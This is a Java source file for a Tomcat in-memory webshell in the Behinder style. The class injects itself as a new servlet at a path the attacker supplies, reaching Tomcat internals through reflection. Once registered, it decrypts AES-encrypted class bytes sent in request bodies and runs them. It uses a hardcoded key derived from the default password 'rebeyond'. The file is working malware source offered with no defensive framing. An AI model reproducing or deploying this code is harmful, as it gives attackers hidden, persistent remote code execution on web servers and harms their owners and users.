package x;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.StandardContext;


import javax.crypto.Cipher;

import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

import java.util.ArrayList;


public class MyBehindServlet extends ClassLoader implements Servlet {


    private String pwd;
    private String path;
    private ServletConfig servletConfig;

    public MyBehindServlet() {

    }

    public void init(ServletConfig paramServletConfig) throws ServletException {
        this.servletConfig = paramServletConfig;
    }

    public ServletConfig getServletConfig() {
        return this.servletConfig;
    }

    // init
    @Override
    public boolean equals(Object conreq) {
        System.out.println("call BehOldDemoServlet equals");
        Request request = (Request) conreq;
        Response response = request.getResponse();
        try {
            this.pwd = request.getParameter("p");
            this.path = request.getParameter("path");
            ServletContext servletContext = request.getServletContext();
            if (this.pwd != null && this.path != null && servletContext != null) {
                dynamicAddServlet(servletContext);
                response.getWriter().write("dynamic inject success");
                response.getWriter().flush();
                response.getWriter().close();
            } else {
                response.getWriter().write("dynamic inject Fail");
                response.getWriter().flush();
                response.getWriter().close();
            }
        } catch (Exception e) {
            try {
                StackTraceElement[] stackTraceElementArray = e.getStackTrace();
                StringBuffer sb = new StringBuffer();
                for (StackTraceElement stackTraceElement : stackTraceElementArray) {
                    sb.append(stackTraceElement.toString()).append("\n");
                }
                response.getWriter().write(sb.toString());
                response.getWriter().flush();
                response.getWriter().close();
            } catch (IOException ioException) {
                ;
            }
        }
        return true;
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public void service(ServletRequest arg0, ServletResponse arg1)
            throws ServletException, IOException {
        HttpServletRequest request;
        HttpServletResponse response;
        try {
            request = (HttpServletRequest) arg0;
            response = (HttpServletResponse) arg1;
        } catch (ClassCastException var6) {
            throw new ServletException("non-HTTP request or response");
        }

        this.behindServerCore(request, response);
    }




    public void behindServerCore(HttpServletRequest request, HttpServletResponse response) {
        System.out.println("behindServerCore is called");
        HttpSession session = request.getSession();
        if (true) {
            try {
                response.setContentType("text/html");
                String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                session.putValue("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));

                // new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
                Class evilClass = new MyBehindServlet(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())));

                Object o = evilClass.newInstance();
                Method a = evilClass.getDeclaredMethod("fengyue", ServletRequest.class, ServletResponse.class, HttpSession.class);

                a.invoke(o, request, response, session);
            } catch (Exception e) {
                System.out.println("behind server 执行异常:" + e.toString());
                e.printStackTrace();
            }
        }

    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }

    public MyBehindServlet(ClassLoader classLoader) {
        super(classLoader);
    }

    public void dynamicAddServlet(ServletContext servletContext) throws Exception {
        System.out.println("dynamic Add Servlet");
        String wrapperName = this.path;
        StandardContext standardContext = null;
        // get standardContext
        // ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
        // Field applicationContextField = applicationContextFacade.getClass().getDeclaredField("context");
        // applicationContextField.setAccessible(true);
        //
        // // 获取ApplicationContext对象
        // ApplicationContext applicationContext = (ApplicationContext) applicationContextField
        //         .get(applicationContextFacade);
        // Field standardContextField = applicationContext.getClass().getDeclaredField("context");
        // standardContextField.setAccessible(true);
        // // 获取standardContext对象
        // StandardContext standardContext = (StandardContext) standardContextField
        //         .get(applicationContext);
        // Field field = servletContext.getClass().getDeclaredField("context");
        // field.setAccessible(true);
        for (; standardContext == null; ) {
            java.lang.reflect.Field contextField = servletContext.getClass()
                    .getDeclaredField("context");
            contextField.setAccessible(true);
            Object o = contextField.get(servletContext);

            if (o instanceof javax.servlet.ServletContext) {
                servletContext = (javax.servlet.ServletContext) o;
                System.out.println("servlet的context对象为属于javax.servlet.ServletContext");
            } else if (o instanceof org.apache.catalina.core.StandardContext) {
                standardContext = (org.apache.catalina.core.StandardContext) o;
                System.out.println("servlet的context对象为属于javax.servlet.StandardContext");
            }
        }

        // Class standardContextClass=Class.forName()
        // 创建createWrapper


        Object newWrapper = this.invoke(standardContext, "createWrapper", (Object[]) null);

        this.invoke(newWrapper, "setName", wrapperName);


        setFieldValue(newWrapper, "instance", this);
        Class containerClass = Class.forName("org.apache.catalina.Container", false,
                standardContext.getClass().getClassLoader());
        Object oldWrapper = this.invoke(standardContext, "findChild", wrapperName);
        if (oldWrapper != null) {
            standardContext.getClass().getDeclaredMethod("removeChild", containerClass);
        }

        Method addChildMethod=getMethodByClass(standardContext.getClass(),"addChild",containerClass);
        addChildMethod.invoke(standardContext,newWrapper);

        // standardContext.getClass().getDeclaredMethod("addChild", containerClass)
        //         .invoke(standardContext, newWrapper);

        Method method;
        try {
            method = standardContext.getClass()
                    .getMethod("addServletMappingDecoded", String.class, String.class);
        } catch (Exception var9) {
            method = standardContext.getClass()
                    .getMethod("addServletMapping", String.class, String.class);
        }

        method.invoke(standardContext, path, wrapperName);

        this.init((ServletConfig) getFieldValue(newWrapper, "facade"));
    }

    private void transform(Object standardContext, String path) throws Exception {
        Object containerBase = this.invoke(standardContext, "getParent", (Object[]) null);
        Class mapperListenerClass = Class.forName("org.apache.catalina.connector.MapperListener", false,
                containerBase.getClass().getClassLoader());
        Field listenersField = Class.forName("org.apache.catalina.core.ContainerBase", false,
                containerBase.getClass().getClassLoader()).getDeclaredField("listeners");
        listenersField.setAccessible(true);
        ArrayList listeners = (ArrayList) listenersField.get(containerBase);

        for (int i = 0; i < listeners.size(); ++i) {
            Object mapperListener_Mapper = listeners.get(i);
            if (mapperListener_Mapper != null && mapperListenerClass
                    .isAssignableFrom(mapperListener_Mapper.getClass())) {
                Object mapperListener_Mapper2 = getFieldValue(mapperListener_Mapper, "mapper");
                Object mapperListener_Mapper_hosts = getFieldValue(mapperListener_Mapper2, "hosts");

                for (int j = 0; j < Array.getLength(mapperListener_Mapper_hosts); ++j) {
                    Object mapperListener_Mapper_host = Array.get(mapperListener_Mapper_hosts, j);
                    Object mapperListener_Mapper_hosts_contextList = getFieldValue(mapperListener_Mapper_host,
                            "contextList");
                    Object mapperListener_Mapper_hosts_contextList_contexts = getFieldValue(
                            mapperListener_Mapper_hosts_contextList, "contexts");

                    for (int k = 0; k < Array.getLength(mapperListener_Mapper_hosts_contextList_contexts);
                         ++k) {
                        Object mapperListener_Mapper_hosts_contextList_context = Array
                                .get(mapperListener_Mapper_hosts_contextList_contexts, k);
                        if (standardContext
                                .equals(getFieldValue(mapperListener_Mapper_hosts_contextList_context, "object"))) {
                            new ArrayList();
                            Object standardContext_Mapper = this
                                    .invoke(standardContext, "getMapper", (Object[]) null);
                            Object standardContext_Mapper_Context = getFieldValue(standardContext_Mapper,
                                    "context");
                            Object standardContext_Mapper_Context_exactWrappers = getFieldValue(
                                    standardContext_Mapper_Context, "exactWrappers");
                            Object mapperListener_Mapper_hosts_contextList_context_exactWrappers = getFieldValue(
                                    mapperListener_Mapper_hosts_contextList_context, "exactWrappers");

                            int l;
                            Object Mapper_Wrapper;
                            Method addWrapperMethod;
                            for (l = 0; l < Array
                                    .getLength(mapperListener_Mapper_hosts_contextList_context_exactWrappers); ++l) {
                                Mapper_Wrapper = Array
                                        .get(mapperListener_Mapper_hosts_contextList_context_exactWrappers, l);
                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                                    addWrapperMethod = mapperListener_Mapper2.getClass()
                                            .getDeclaredMethod("removeWrapper",
                                                    mapperListener_Mapper_hosts_contextList_context.getClass(), String.class);
                                    addWrapperMethod.setAccessible(true);
                                    addWrapperMethod.invoke(mapperListener_Mapper2,
                                            mapperListener_Mapper_hosts_contextList_context, path);
                                }
                            }

                            for (l = 0; l < Array.getLength(standardContext_Mapper_Context_exactWrappers); ++l) {
                                Mapper_Wrapper = Array.get(standardContext_Mapper_Context_exactWrappers, l);
                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                                    addWrapperMethod = mapperListener_Mapper2.getClass()
                                            .getDeclaredMethod("addWrapper",
                                                    mapperListener_Mapper_hosts_contextList_context.getClass(), String.class,
                                                    Object.class);
                                    addWrapperMethod.setAccessible(true);
                                    addWrapperMethod.invoke(mapperListener_Mapper2,
                                            mapperListener_Mapper_hosts_contextList_context, path,
                                            getFieldValue(Mapper_Wrapper, "object"));
                                }
                            }
                        }
                    }
                }
            }
        }

    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field) obj;
        } else {
            f = obj.getClass().getDeclaredField(fieldName);
        }

        f.setAccessible(true);
        f.set(obj, value);
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field) obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();

            while (cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
        }

        f.setAccessible(true);
        return f.get(obj);
    }

    private Object invoke(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for (int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add((Object) null);
                    }
                }
            }

            Method method = this
                    .getMethodByClass(obj.getClass(), methodName, (Class[]) classes.toArray(new Class[0]));
            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }

    }

    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;

        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }


    private Field getFieldByClass(Class cs, String fieldName) {
        Field field = null;

        while (cs != null) {
            try {
                field = cs.getDeclaredField(fieldName);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return field;
    }
}
